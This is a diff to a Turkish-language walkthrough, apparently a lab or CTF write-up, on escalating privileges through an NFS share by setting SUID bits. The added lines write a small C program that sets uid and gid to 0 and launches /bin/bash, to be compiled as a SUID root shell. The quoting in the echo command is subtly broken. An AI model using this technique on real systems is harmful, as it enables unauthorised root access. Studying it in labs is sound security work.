@@ -62,6 +62,19 @@ SUID bitlerini ayarlayabildiğimiz için hedef sistemde /bin/bash'i çalıştır
 
 ![image](https://github.com/user-attachments/assets/dde4845c-94af-41e1-a82c-d190484f33e3)
 
+```bash
+echo "int main(){
+
+setgid(0);
+
+setuid(0);
+
+system("/bin/bash");
+
+return 0;
+}" >> nfs.c
+```
+
 Kodu derlediğimizde SUID bitini ayarlayacağız.
 
 ![image](https://github.com/user-attachments/assets/2f97d0c4-0266-4fca-97a3-251db79a799f)
